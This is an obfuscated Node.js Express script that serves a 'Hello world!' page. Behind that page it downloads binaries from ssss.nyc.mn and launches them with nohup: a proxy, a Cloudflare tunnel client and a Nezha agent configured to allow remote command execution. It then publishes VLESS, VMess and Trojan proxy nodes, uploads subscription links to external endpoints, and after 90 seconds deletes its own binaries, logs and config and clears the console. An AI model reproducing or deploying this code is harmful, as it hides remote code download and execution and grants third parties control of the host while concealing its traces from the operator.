const _0x3a1530=_0x4457;(function(_0x5c4d4b,_0x1f2b11){const _0xd55325=_0x4457,_0x5d2042=_0x5c4d4b();while(!![]){try{const _0x4b7b86=-parseInt(_0xd55325(0x1f9))/0x1+parseInt(_0xd55325(0x274))/0x2+-parseInt(_0xd55325(0x277))/0x3*(-parseInt(_0xd55325(0x262))/0x4)+parseInt(_0xd55325(0x25e))/0x5+parseInt(_0xd55325(0x24b))/0x6+-parseInt(_0xd55325(0x248))/0x7*(-parseInt(_0xd55325(0x273))/0x8)+-parseInt(_0xd55325(0x263))/0x9*(parseInt(_0xd55325(0x25a))/0xa);if(_0x4b7b86===_0x1f2b11)break;else _0x5d2042['push'](_0x5d2042['shift']());}catch(_0x3fb149){_0x5d2042['push'](_0x5d2042['shift']());}}}(_0x1830,0x6b973));const express=require(_0x3a1530(0x241)),app=express(),axios=require(_0x3a1530(0x20e)),os=require('os'),fs=require('fs'),path=require(_0x3a1530(0x237)),{promisify}=require(_0x3a1530(0x288)),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x3a1530(0x20d)][_0x3a1530(0x246)]||'',PROJECT_URL=process[_0x3a1530(0x20d)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x3a1530(0x20d)][_0x3a1530(0x27a)]||![],FILE_PATH=process[_0x3a1530(0x20d)][_0x3a1530(0x20a)]||_0x3a1530(0x28b),SUB_PATH=process[_0x3a1530(0x20d)][_0x3a1530(0x21a)]||_0x3a1530(0x240),PORT=process[_0x3a1530(0x20d)][_0x3a1530(0x239)]||process[_0x3a1530(0x20d)][_0x3a1530(0x22b)]||0xbb8,UUID=process[_0x3a1530(0x20d)]['UUID']||_0x3a1530(0x278),NEZHA_SERVER=process[_0x3a1530(0x20d)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3a1530(0x20d)][_0x3a1530(0x1f8)]||'',NEZHA_KEY=process[_0x3a1530(0x20d)][_0x3a1530(0x1e3)]||'',ARGO_DOMAIN=process[_0x3a1530(0x20d)][_0x3a1530(0x244)]||'',ARGO_AUTH=process[_0x3a1530(0x20d)][_0x3a1530(0x270)]||'',ARGO_PORT=process[_0x3a1530(0x20d)][_0x3a1530(0x1fc)]||0x1f41,CFIP=process[_0x3a1530(0x20d)][_0x3a1530(0x1ea)]||_0x3a1530(0x1fb),CFPORT=process[_0x3a1530(0x20d)][_0x3a1530(0x228)]||0x1bb,NAME=process['env']['NAME']||_0x3a1530(0x23c);!fs['existsSync'](FILE_PATH)?(fs[_0x3a1530(0x287)](FILE_PATH),console[_0x3a1530(0x255)](FILE_PATH+'\x20is\x20created')):console[_0x3a1530(0x255)](FILE_PATH+_0x3a1530(0x1fe));let npmPath=path[_0x3a1530(0x21c)](FILE_PATH,_0x3a1530(0x236)),phpPath=path[_0x3a1530(0x21c)](FILE_PATH,_0x3a1530(0x24c)),webPath=path[_0x3a1530(0x21c)](FILE_PATH,'web'),botPath=path[_0x3a1530(0x21c)](FILE_PATH,_0x3a1530(0x1ec)),subPath=path[_0x3a1530(0x21c)](FILE_PATH,_0x3a1530(0x247)),listPath=path[_0x3a1530(0x21c)](FILE_PATH,'list.txt'),bootLogPath=path[_0x3a1530(0x21c)](FILE_PATH,'boot.log'),configPath=path[_0x3a1530(0x21c)](FILE_PATH,'config.json');function deleteNodes(){const _0x3d226f=_0x3a1530;try{if(!UPLOAD_URL)return;if(!fs[_0x3d226f(0x1ee)](subPath))return;let _0x48482e;try{_0x48482e=fs[_0x3d226f(0x27e)](subPath,_0x3d226f(0x235));}catch{return null;}const _0x206d16=Buffer[_0x3d226f(0x22e)](_0x48482e,_0x3d226f(0x292))['toString'](_0x3d226f(0x235)),_0x5210e8=_0x206d16[_0x3d226f(0x27d)]('\x0a')['filter'](_0x1bb897=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3d226f(0x281)](_0x1bb897));if(_0x5210e8[_0x3d226f(0x279)]===0x0)return;return axios[_0x3d226f(0x28a)](UPLOAD_URL+_0x3d226f(0x286),JSON[_0x3d226f(0x272)]({'nodes':_0x5210e8}),{'headers':{'Content-Type':_0x3d226f(0x21d)}})[_0x3d226f(0x28c)](_0x19c230=>{return null;});}catch(_0x94a0f){return null;}}function cleanupOldFiles(){const _0x1c8bc3=_0x3a1530,_0x19a702=[_0x1c8bc3(0x291),'bot','npm',_0x1c8bc3(0x24c),'sub.txt',_0x1c8bc3(0x22a)];_0x19a702['forEach'](_0x78f302=>{const _0xc6bc8d=_0x1c8bc3,_0x47be45=path[_0xc6bc8d(0x21c)](FILE_PATH,_0x78f302);fs[_0xc6bc8d(0x250)](_0x47be45,()=>{});});}app[_0x3a1530(0x234)]('/',function(_0x153d26,_0x2c0269){const _0x53f656=_0x3a1530;_0x2c0269[_0x53f656(0x1ff)](_0x53f656(0x265));});const config={'log':{'access':_0x3a1530(0x210),'error':_0x3a1530(0x210),'loglevel':_0x3a1530(0x245)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3a1530(0x21e),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3a1530(0x245),'fallbacks':[{'dest':0xbb9},{'path':_0x3a1530(0x249),'dest':0xbba},{'path':_0x3a1530(0x280),'dest':0xbbb},{'path':_0x3a1530(0x23e),'dest':0xbbc}]},'streamSettings':{'network':_0x3a1530(0x23a)}},{'port':0xbb9,'listen':_0x3a1530(0x25b),'protocol':_0x3a1530(0x21e),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x3a1530(0x23a),'security':_0x3a1530(0x245)}},{'port':0xbba,'listen':_0x3a1530(0x25b),'protocol':_0x3a1530(0x21e),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x3a1530(0x245),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3a1530(0x24f),_0x3a1530(0x211),_0x3a1530(0x258)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3a1530(0x25b),'protocol':_0x3a1530(0x1f0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3a1530(0x24f),_0x3a1530(0x211),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3a1530(0x25b),'protocol':_0x3a1530(0x22f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3a1530(0x245),'wsSettings':{'path':_0x3a1530(0x23e)}},'sniffing':{'enabled':!![],'destOverride':[_0x3a1530(0x24f),_0x3a1530(0x211),_0x3a1530(0x258)],'metadataOnly':![]}}],'dns':{'servers':[_0x3a1530(0x219)]},'outbounds':[{'protocol':_0x3a1530(0x21b),'tag':'direct'},{'protocol':'blackhole','tag':_0x3a1530(0x230)}]};fs[_0x3a1530(0x1f1)](path[_0x3a1530(0x21c)](FILE_PATH,'config.json'),JSON[_0x3a1530(0x272)](config,null,0x2));function _0x4457(_0x532415,_0x5a8ac0){const _0x18304a=_0x1830();return _0x4457=function(_0x445782,_0x4d3ae8){_0x445782=_0x445782-0x1e1;let _0x21cd15=_0x18304a[_0x445782];return _0x21cd15;},_0x4457(_0x532415,_0x5a8ac0);}function getSystemArchitecture(){const _0x45fbf5=_0x3a1530,_0xc05b52=os['arch']();return _0xc05b52===_0x45fbf5(0x289)||_0xc05b52===_0x45fbf5(0x293)||_0xc05b52===_0x45fbf5(0x218)?_0x45fbf5(0x289):'amd';}function downloadFile(_0x61a14e,_0x574b5a,_0x5cab60){const _0x5943ab=_0x3a1530,_0x25c32e=path[_0x5943ab(0x21c)](FILE_PATH,_0x61a14e),_0x5cdb24=fs[_0x5943ab(0x224)](_0x25c32e);axios({'method':_0x5943ab(0x234),'url':_0x574b5a,'responseType':_0x5943ab(0x24e)})[_0x5943ab(0x1f7)](_0x35e5fb=>{const _0x5d0a56=_0x5943ab;_0x35e5fb[_0x5d0a56(0x209)][_0x5d0a56(0x1e1)](_0x5cdb24),_0x5cdb24['on'](_0x5d0a56(0x257),()=>{const _0x53deab=_0x5d0a56;_0x5cdb24[_0x53deab(0x1ed)](),console[_0x53deab(0x255)]('Download\x20'+_0x61a14e+_0x53deab(0x25f)),_0x5cab60(null,_0x61a14e);}),_0x5cdb24['on']('error',_0x51c97a=>{const _0x2c2467=_0x5d0a56;fs['unlink'](_0x25c32e,()=>{});const _0x440657=_0x2c2467(0x28f)+_0x61a14e+_0x2c2467(0x26d)+_0x51c97a['message'];console[_0x2c2467(0x1e7)](_0x440657),_0x5cab60(_0x440657);});})['catch'](_0x3ed8e7=>{const _0x32ee24=_0x5943ab,_0x1a41fe='Download\x20'+_0x61a14e+_0x32ee24(0x26d)+_0x3ed8e7[_0x32ee24(0x206)];console[_0x32ee24(0x1e7)](_0x1a41fe),_0x5cab60(_0x1a41fe);});}async function downloadFilesAndRun(){const _0x21e3f9=_0x3a1530,_0x3efc4d=getSystemArchitecture(),_0x5a29de=getFilesForArchitecture(_0x3efc4d);if(_0x5a29de[_0x21e3f9(0x279)]===0x0){console[_0x21e3f9(0x255)](_0x21e3f9(0x20c));return;}const _0x1cf56d=_0x5a29de[_0x21e3f9(0x275)](_0x491ba1=>{return new Promise((_0x6e2135,_0xf77222)=>{const _0x533198=_0x4457;downloadFile(_0x491ba1[_0x533198(0x27f)],_0x491ba1['fileUrl'],(_0x2a3ff7,_0x6729d3)=>{_0x2a3ff7?_0xf77222(_0x2a3ff7):_0x6e2135(_0x6729d3);});});});try{await Promise[_0x21e3f9(0x222)](_0x1cf56d);}catch(_0xcb448d){console[_0x21e3f9(0x1e7)](_0x21e3f9(0x252),_0xcb448d);return;}function _0x31c21f(_0x588162){const _0x267392=_0x21e3f9,_0x1a62ed=0x1fd;_0x588162[_0x267392(0x232)](_0x4e752a=>{const _0x3e59e5=path['join'](FILE_PATH,_0x4e752a);fs['existsSync'](_0x3e59e5)&&fs['chmod'](_0x3e59e5,_0x1a62ed,_0x3bf449=>{const _0x4663c0=_0x4457;_0x3bf449?console[_0x4663c0(0x1e7)](_0x4663c0(0x217)+_0x3e59e5+':\x20'+_0x3bf449):console[_0x4663c0(0x255)](_0x4663c0(0x1e5)+_0x3e59e5+':\x20'+_0x1a62ed[_0x4663c0(0x260)](0x8));});});}const _0x307941=NEZHA_PORT?['./npm',_0x21e3f9(0x201),'./bot']:[_0x21e3f9(0x221),_0x21e3f9(0x201),_0x21e3f9(0x26b)];_0x31c21f(_0x307941);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4bc71a=NEZHA_SERVER[_0x21e3f9(0x256)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x3c9911=new Set([_0x21e3f9(0x214),_0x21e3f9(0x25c),_0x21e3f9(0x25d),'2087',_0x21e3f9(0x28d),'2053']),_0x1ae1fd=_0x3c9911[_0x21e3f9(0x1f3)](_0x4bc71a)?_0x21e3f9(0x268):_0x21e3f9(0x266),_0x11de80=_0x21e3f9(0x23f)+NEZHA_KEY+_0x21e3f9(0x243)+NEZHA_SERVER+_0x21e3f9(0x1e9)+_0x1ae1fd+_0x21e3f9(0x20f)+UUID;fs[_0x21e3f9(0x1f1)](path['join'](FILE_PATH,_0x21e3f9(0x23d)),_0x11de80);const _0x3042c4=_0x21e3f9(0x20b)+FILE_PATH+_0x21e3f9(0x253)+FILE_PATH+_0x21e3f9(0x26a);try{await exec(_0x3042c4),console[_0x21e3f9(0x255)](_0x21e3f9(0x223)),await new Promise(_0x47e7d2=>setTimeout(_0x47e7d2,0x3e8));}catch(_0x3cebc1){console[_0x21e3f9(0x1e7)](_0x21e3f9(0x269)+_0x3cebc1);}}else{let _0x1c0ce0='';const _0x13d751=[_0x21e3f9(0x214),'8443',_0x21e3f9(0x25d),_0x21e3f9(0x21f),_0x21e3f9(0x28d),'2053'];_0x13d751[_0x21e3f9(0x256)](NEZHA_PORT)&&(_0x1c0ce0=_0x21e3f9(0x1f4));const _0x479f4f='nohup\x20'+FILE_PATH+_0x21e3f9(0x271)+NEZHA_SERVER+':'+NEZHA_PORT+_0x21e3f9(0x216)+NEZHA_KEY+'\x20'+_0x1c0ce0+_0x21e3f9(0x208);try{await exec(_0x479f4f),console[_0x21e3f9(0x255)](_0x21e3f9(0x1eb)),await new Promise(_0x453063=>setTimeout(_0x453063,0x3e8));}catch(_0x23f484){console['error']('npm\x20running\x20error:\x20'+_0x23f484);}}}else console[_0x21e3f9(0x255)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2549f8=_0x21e3f9(0x20b)+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x21e3f9(0x1fa);try{await exec(_0x2549f8),console[_0x21e3f9(0x255)]('web\x20is\x20running'),await new Promise(_0x1e61e2=>setTimeout(_0x1e61e2,0x3e8));}catch(_0x1e8b69){console[_0x21e3f9(0x1e7)](_0x21e3f9(0x213)+_0x1e8b69);}if(fs[_0x21e3f9(0x1ee)](path[_0x21e3f9(0x21c)](FILE_PATH,_0x21e3f9(0x1ec)))){let _0x4ea09e;if(ARGO_AUTH[_0x21e3f9(0x261)](/^[A-Z0-9a-z=]{120,250}$/))_0x4ea09e=_0x21e3f9(0x285)+ARGO_AUTH;else ARGO_AUTH[_0x21e3f9(0x261)](/TunnelSecret/)?_0x4ea09e=_0x21e3f9(0x259)+FILE_PATH+_0x21e3f9(0x254):_0x4ea09e=_0x21e3f9(0x200)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x21e3f9(0x20b)+FILE_PATH+'/bot\x20'+_0x4ea09e+_0x21e3f9(0x208)),console[_0x21e3f9(0x255)]('bot\x20is\x20running'),await new Promise(_0x222f00=>setTimeout(_0x222f00,0x7d0));}catch(_0x1ee5bc){console['error']('Error\x20executing\x20command:\x20'+_0x1ee5bc);}}await new Promise(_0x7b05fc=>setTimeout(_0x7b05fc,0x1388));}function getFilesForArchitecture(_0x1ad4e6){const _0x23092d=_0x3a1530;let _0x1b7ba2;_0x1ad4e6==='arm'?_0x1b7ba2=[{'fileName':_0x23092d(0x291),'fileUrl':_0x23092d(0x22c)},{'fileName':_0x23092d(0x1ec),'fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x1b7ba2=[{'fileName':_0x23092d(0x291),'fileUrl':_0x23092d(0x284)},{'fileName':_0x23092d(0x1ec),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2ddc48=_0x1ad4e6===_0x23092d(0x289)?'https://arm64.ssss.nyc.mn/agent':_0x23092d(0x225);_0x1b7ba2[_0x23092d(0x1f6)]({'fileName':_0x23092d(0x236),'fileUrl':_0x2ddc48});}else{const _0x3a1d77=_0x1ad4e6==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x23092d(0x1f2);_0x1b7ba2[_0x23092d(0x1f6)]({'fileName':_0x23092d(0x24c),'fileUrl':_0x3a1d77});}}return _0x1b7ba2;}function argoType(){const _0x1afb3b=_0x3a1530;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1afb3b(0x255)](_0x1afb3b(0x212));return;}if(ARGO_AUTH[_0x1afb3b(0x256)](_0x1afb3b(0x26f))){fs[_0x1afb3b(0x1f1)](path[_0x1afb3b(0x21c)](FILE_PATH,_0x1afb3b(0x203)),ARGO_AUTH);const _0x226161=_0x1afb3b(0x22d)+ARGO_AUTH[_0x1afb3b(0x27d)]('\x22')[0xb]+_0x1afb3b(0x27b)+path[_0x1afb3b(0x21c)](FILE_PATH,_0x1afb3b(0x203))+_0x1afb3b(0x1ef)+ARGO_DOMAIN+_0x1afb3b(0x1e4)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x1afb3b(0x21c)](FILE_PATH,'tunnel.yml'),_0x226161);}else console[_0x1afb3b(0x255)](_0x1afb3b(0x207));}argoType();async function extractDomains(){const _0x223b06=_0x3a1530;let _0x434d09;if(ARGO_AUTH&&ARGO_DOMAIN)_0x434d09=ARGO_DOMAIN,console[_0x223b06(0x255)](_0x223b06(0x267),_0x434d09),await _0x4bbee1(_0x434d09);else try{const _0x1df9e2=fs['readFileSync'](path[_0x223b06(0x21c)](FILE_PATH,'boot.log'),_0x223b06(0x235)),_0x27a001=_0x1df9e2[_0x223b06(0x27d)]('\x0a'),_0x157889=[];_0x27a001[_0x223b06(0x232)](_0x3cad7e=>{const _0x442ade=_0x223b06,_0x1c5133=_0x3cad7e[_0x442ade(0x261)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1c5133){const _0x3d1887=_0x1c5133[0x1];_0x157889[_0x442ade(0x215)](_0x3d1887);}});if(_0x157889[_0x223b06(0x279)]>0x0)_0x434d09=_0x157889[0x0],console[_0x223b06(0x255)](_0x223b06(0x231),_0x434d09),await _0x4bbee1(_0x434d09);else{console[_0x223b06(0x255)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x223b06(0x1e8)](path['join'](FILE_PATH,'boot.log'));async function _0x4a48d5(){const _0x29c937=_0x223b06;try{await exec(_0x29c937(0x229));}catch(_0x59a75c){}}_0x4a48d5(),await new Promise(_0x333977=>setTimeout(_0x333977,0xbb8));const _0x13dd6d=_0x223b06(0x200)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x223b06(0x20b)+path[_0x223b06(0x21c)](FILE_PATH,_0x223b06(0x1ec))+'\x20'+_0x13dd6d+_0x223b06(0x208)),console[_0x223b06(0x255)](_0x223b06(0x27c)),await new Promise(_0x3b5e70=>setTimeout(_0x3b5e70,0xbb8)),await extractDomains();}catch(_0x9ae73e){console['error'](_0x223b06(0x238)+_0x9ae73e);}}}catch(_0x3f0202){console[_0x223b06(0x1e7)]('Error\x20reading\x20boot.log:',_0x3f0202);}async function _0x4bbee1(_0x5cd55b){const _0x5d0b44=_0x223b06,_0x3d0482=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x5d0b44(0x235)}),_0x57492a=_0x3d0482[_0x5d0b44(0x28e)]();return new Promise(_0x9194b3=>{setTimeout(()=>{const _0x1cde69=_0x4457,_0x193af4={'v':'2','ps':NAME+'-'+_0x57492a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1cde69(0x245),'host':_0x5cd55b,'path':_0x1cde69(0x242),'tls':_0x1cde69(0x211),'sni':_0x5cd55b,'alpn':''},_0x4733a4=_0x1cde69(0x26c)+UUID+'@'+CFIP+':'+CFPORT+_0x1cde69(0x282)+_0x5cd55b+_0x1cde69(0x233)+_0x5cd55b+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x57492a+_0x1cde69(0x1e2)+Buffer[_0x1cde69(0x22e)](JSON[_0x1cde69(0x272)](_0x193af4))['toString'](_0x1cde69(0x292))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x1cde69(0x24a)+_0x5cd55b+'&type=ws&host='+_0x5cd55b+_0x1cde69(0x26e)+NAME+'-'+_0x57492a+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x1cde69(0x22e)](_0x4733a4)['toString'](_0x1cde69(0x292))),fs[_0x1cde69(0x1f1)](subPath,Buffer[_0x1cde69(0x22e)](_0x4733a4)[_0x1cde69(0x260)](_0x1cde69(0x292))),console['log'](FILE_PATH+_0x1cde69(0x227)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x4ef074,_0x428701)=>{const _0x531aef=_0x1cde69,_0xd7342f=Buffer[_0x531aef(0x22e)](_0x4733a4)[_0x531aef(0x260)](_0x531aef(0x292));_0x428701[_0x531aef(0x251)](_0x531aef(0x220),_0x531aef(0x24d)),_0x428701[_0x531aef(0x1ff)](_0xd7342f);}),_0x9194b3(_0x4733a4);},0x7d0);});}}async function uplodNodes(){const _0x1fd5c9=_0x3a1530;if(UPLOAD_URL&&PROJECT_URL){const _0x1bdde8=PROJECT_URL+'/'+SUB_PATH,_0x4f51dd={'subscription':[_0x1bdde8]};try{const _0x1e8c34=await axios[_0x1fd5c9(0x28a)](UPLOAD_URL+_0x1fd5c9(0x283),_0x4f51dd,{'headers':{'Content-Type':_0x1fd5c9(0x21d)}});if(_0x1e8c34[_0x1fd5c9(0x226)]===0xc8)console[_0x1fd5c9(0x255)](_0x1fd5c9(0x1e6));else return null;}catch(_0x17c73d){if(_0x17c73d['response']){if(_0x17c73d[_0x1fd5c9(0x1fd)][_0x1fd5c9(0x226)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1fd5c9(0x1ee)](listPath))return;const _0x66f9f7=fs['readFileSync'](listPath,_0x1fd5c9(0x235)),_0x1f4d37=_0x66f9f7[_0x1fd5c9(0x27d)]('\x0a')[_0x1fd5c9(0x290)](_0x381706=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1fd5c9(0x281)](_0x381706));if(_0x1f4d37[_0x1fd5c9(0x279)]===0x0)return;const _0x1a7f58=JSON[_0x1fd5c9(0x272)]({'nodes':_0x1f4d37});try{await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x1a7f58,{'headers':{'Content-Type':_0x1fd5c9(0x21d)}});if(response[_0x1fd5c9(0x226)]===0xc8)console[_0x1fd5c9(0x255)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x458aa8){return null;}}else return;}}function _0x1830(){const _0x532d0e=['stream','http','unlink','set','Error\x20downloading\x20files:','/php\x20-c\x20\x22','/tunnel.yml\x20run','log','includes','finish','quic','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','830QFcsmi','127.0.0.1','8443','2096','4195905iCUkWm','\x20successfully','toString','match','1918400htwwEJ','133956otNhxE','http\x20server\x20is\x20running\x20on\x20port:','Hello\x20world!','false','ARGO_DOMAIN:','true','php\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','./bot','\x0avless://','\x20failed:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','TunnelSecret','ARGO_AUTH','/npm\x20-s\x20','stringify','5347064klLAMS','391624ayhUVY','map','https://oooo.serv00.net/add-url','3OktKEP','326a93b8-2f25-4dfb-947c-ed07eb61ebb6','length','AUTO_ACCESS','\x0a\x20\x20credentials-file:\x20','bot\x20is\x20running.','split','readFileSync','fileName','/vmess-argo','test','?encryption=none&security=tls&sni=','/api/add-subscriptions','https://amd64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/api/delete-nodes','mkdirSync','util','arm','post','./tmp','catch','2083','trim','Download\x20','filter','web','base64','arm64','pipe','\x0a\x20\x20\x0avmess://','NEZHA_KEY','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Empowerment\x20success\x20for\x20','Subscription\x20uploaded\x20successfully','error','unlinkSync','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','CFIP','npm\x20is\x20running','bot','close','existsSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','vmess','writeFileSync','https://amd64.ssss.nyc.mn/v1','has','--tls','添加URL失败:\x20','unshift','then','NEZHA_PORT','691297pplDXX','/config.json\x20>/dev/null\x202>&1\x20&','www.speedtest.net','ARGO_PORT','response','\x20already\x20exists','send','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','./web','rm\x20-rf\x20','tunnel.json','clear','\x20>/dev/null\x202>&1','message','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20>/dev/null\x202>&1\x20&','data','FILE_PATH','nohup\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','env','axios','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/dev/null','tls','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','web\x20running\x20error:\x20','443','push','\x20-p\x20','Empowerment\x20failed\x20for\x20','aarch64','https+local://8.8.8.8/dns-query','SUB_PATH','freedom','join','application/json','vless','2087','Content-Type','./php','all','php\x20is\x20running','createWriteStream','https://amd64.ssss.nyc.mn/agent','status','/sub.txt\x20saved\x20successfully','CFPORT','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','boot.log','PORT','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20tunnel:\x20','from','trojan','block','ArgoDomain:','forEach','&type=ws&host=','get','utf-8','npm','path','Error\x20executing\x20command:\x20','SERVER_PORT','tcp','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Vls','config.yaml','/trojan-argo','\x0aclient_secret:\x20','sub','express','/vmess-argo?ed=2560','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','ARGO_DOMAIN','none','UPLOAD_URL','sub.txt','7mwxFVH','/vless-argo','?security=tls&sni=','1106304UOGQKF','php','text/plain;\x20charset=utf-8'];_0x1830=function(){return _0x532d0e;};return _0x1830();}function cleanFiles(){setTimeout(()=>{const _0x365570=_0x4457,_0x23bfe6=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x23bfe6[_0x365570(0x215)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x23bfe6[_0x365570(0x215)](phpPath);exec(_0x365570(0x202)+_0x23bfe6[_0x365570(0x21c)]('\x20')+_0x365570(0x205),_0x264c86=>{const _0x3cd99d=_0x365570;console[_0x3cd99d(0x204)](),console[_0x3cd99d(0x255)]('App\x20is\x20running'),console['log'](_0x3cd99d(0x23b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3b0476=_0x3a1530;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x508d3b=await axios[_0x3b0476(0x28a)](_0x3b0476(0x276),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x3b0476(0x255)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x4704a0){console['error'](_0x3b0476(0x1f5)+_0x4704a0[_0x3b0476(0x206)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console[_0x3a1530(0x255)](_0x3a1530(0x264)+PORT+'!'));
